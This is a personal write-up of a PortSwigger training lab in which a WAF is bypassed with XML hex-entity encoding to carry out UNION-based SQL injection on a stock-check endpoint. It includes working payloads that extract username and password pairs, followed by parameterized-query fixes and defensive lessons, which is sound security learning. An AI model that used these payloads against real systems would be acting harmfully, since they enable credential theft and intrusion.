## Goal
Demonstrate technical depth, chaining of steps, and security research thinking.

## Lab Details

Lab: SQL Injection with Filter Bypass via XML Encoding

Level: Practitioner

Vulnerability Class: SQL Injection — UNION-based

Lab URL: [PortSwigger Lab](https://portswigger.net/web-security/learning-paths/sql-injection/
sql-injection-in-different-contexts/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding)

Date Completed: 07-Aug-2026

Time to Solve: 15 minutes

---

## Vulnerability Summary
The stock-check feature accepts a POST request whose body is XML-encoded, containing a
`productId` and a `storeId` parameter. The `storeId` value is interpolated directly into
a SQL query without sanitization, making it susceptible to UNION-based injection. A Web
Application Firewall (WAF) sits in front of the endpoint and blocks requests containing
recognizable SQL keywords; however, this control can be circumvented by encoding the
payload as XML hexadecimal entities, allowing full extraction of the `users` table,
including administrator credentials.

---

## Reconnaissance

**Step 1 — Confirm evaluated input**

The stock-check feature sends the following XML body:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>1</productId>
    <storeId>1</storeId>
</stockCheck>
```

Modifying `storeId` to `1+1` caused the application to return the stock for store 2,
confirming the parameter value is being arithmetically evaluated before being passed to
the SQL engine — a strong indicator of unsanitized input.

**Step 2 — Confirm WAF presence**

Submitting a UNION SELECT payload in plaintext:

```xml
<storeId>1 UNION SELECT NULL</storeId>
```

returned an "Attack detected" block response, confirming a WAF is inspecting the request
body for SQL metacharacters and keywords.

**Indicators observed:**

- Arithmetic expression `1+1` was evaluated server-side → confirms expression evaluation,
  not strict type enforcement.
- Plain UNION SELECT was blocked → confirms WAF pattern-matching on SQL keywords.
- XML context → XML entity encoding is a viable obfuscation vector.

---

## Exploitation — Step by Step

### Step 1: Determine Column Count

To find the number of columns returned by the original query, a UNION SELECT with
incrementing NULLs was used. The WAF-bypass encoding (see Step 2) was applied from this
point forward.

```xml
<storeId><@hex_entities>1 UNION SELECT NULL</@hex_entities></storeId>
```

The application returned a valid stock figure, indicating a single-column result set.
Appending a second NULL caused the application to return 0 units, which typically signals
a column-count mismatch error handled silently by the application.

**Conclusion:** the backend query returns exactly 1 column.

### Step 2: Bypass the WAF via XML Hex-Entity Encoding

Since the payload is delivered inside an XML body, XML character entity encoding
(hexadecimal form, e.g., `&#x55;` for `U`) is a valid technique to obfuscate SQL
keywords from the WAF while still being interpreted correctly by the XML parser before
the value reaches the SQL engine. The Hackvertor extension in Burp Suite automates this
with its `<@hex_entities>` tag.

The encoded payload for the column-count check above is transparently decoded by the XML
parser and reaches the SQL interpreter intact, bypassing the WAF's pattern matching.

### Step 3: Extract Credentials via String Concatenation

Since only one column is available, the `username` and `password` columns must be
returned as a single concatenated string using the `||` concatenation operator
(PostgreSQL syntax):

```xml
<storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users</@hex_entities></storeId>
```

The response returned a list of username~password pairs. The administrator credentials
were identified and used to authenticate to the application.

---

### Key Payload(s)

```sql
-- Final working payload (Hackvertor syntax, sent via Burp Repeater)
<storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users</@hex_entities></storeId>

-- Reconstructed query executed server-side (after XML parsing and WAF bypass)
SELECT stock FROM products WHERE storeId = 1
UNION SELECT username || '~' || password FROM users--
```

### Tools Used

- Manual exploitation (Burp Suite Repeater)
- Burp Suite Extension: Hackvertor (hex entity encoding)

> **Note:** For portfolio purposes, manual exploitation was performed first to understand
> the injection mechanics. Automated tools such as `sqlmap` were not used for this lab.

---

## The Fix

**Root Cause:** The `storeId` value from the XML body is concatenated directly into the
SQL query string rather than being passed as a parameterized input.

**Recommended Remediation — Parameterized Queries:**

```java
// Java (JDBC) — parameterized query
String sql = "SELECT stock FROM products WHERE storeId = ?";
PreparedStatement ps = connection.prepareStatement(sql);
ps.setInt(1, storeId); // storeId should also be validated as an integer before this
ResultSet rs = ps.executeQuery();
```

```js
// Node.js (mysql2)
const [rows] = await connection.execute(
    'SELECT stock FROM products WHERE storeId = ?',
    [storeId]
);
```

```python
# Python (psycopg2 — PostgreSQL)
cursor.execute("SELECT stock FROM products WHERE store_id = %s", (store_id,))
```

**Additional mitigations:**

- **Input type validation:** `storeId` should be validated as a positive integer before
  it reaches any query logic. Reject anything that is not a digit.
- **Least-privilege database user:** The application's DB user should only have SELECT
  rights on the tables it needs. It should not have access to the `users` table from
  the stock-check service context.
- **WAF hardening (defense-in-depth only):** The WAF provided a layer of control but
  was bypassable via encoding. WAFs should never be the primary defense against SQLi —
  parameterized queries must be the baseline. The WAF adds noise and raises the
  attacker's effort, but is not a substitute.
- **Suppress verbose errors:** The application should never return raw SQL errors or
  stack traces to the client. Generic error messages with server-side logging are the
  correct pattern.
- **XML input validation:** If the endpoint only needs an integer storeId, enforce that
  constraint at the XML schema (XSD) level as well.

---

## What I Found Interesting / Unexpected

The most instructive aspect of this lab was observing that the WAF was inspecting the
raw HTTP request body for SQL keywords rather than the post-parsed value. XML entity
encoding is fully transparent to an XML parser — the decoder operates before any
application logic runs — so the SQL string arrives at the query builder completely intact
after passing through the WAF undetected. This highlights a fundamental limitation of
signature-based WAF rules: they operate on the wire representation of the data, not on
its semantic interpretation. Any encoding scheme that the server's parser understands but
the WAF does not enumerate will create a bypass opportunity.

It also reinforced that **non-textual or structured input formats (XML, JSON, HTTP
headers, cookies) are just as susceptible to SQLi as plain form fields** — and in some
cases more dangerous, precisely because they are less scrutinized by developers who
associate SQL injection with `<input>` boxes.

---

## Real-World Relevance

[**Ideas for you to expand:**]

---

## Connections to My Own Projects


---

## Takeaway

WAFs are a meaningful layer of defense-in-depth but are not a reliable primary control
against SQL injection — encoding schemes such as XML hex entities can trivially bypass
signature-based detection. The only durable fix is eliminating string concatenation from
query construction entirely, using parameterized queries or prepared statements at the
data access layer, regardless of the input format. Developers should treat every value
that enters a query — whether from a form field, a URL parameter, an HTTP header, or a
structured XML/JSON body — as untrusted input that must be parameterized.